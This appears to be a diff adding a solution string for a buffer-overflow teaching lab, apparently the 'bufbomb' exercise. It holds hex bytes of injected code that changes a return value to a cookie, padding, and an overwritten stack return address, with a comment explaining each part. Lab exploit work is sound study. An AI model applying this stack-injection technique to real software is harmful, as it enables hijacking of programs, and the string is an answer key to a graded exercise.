@@ -1,0 +1,5 @@
+b8 d0 79 2e 7f bd 60 31 68 55 
+68 50 8e 04 08 c3 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 08 31 68 55 /* last 4 bytes : the address of exploit code in stack, first 16 bytes : exploit code to change the return value from 1 to cookie, maintain the original state of stack and register, and ret to test */ 
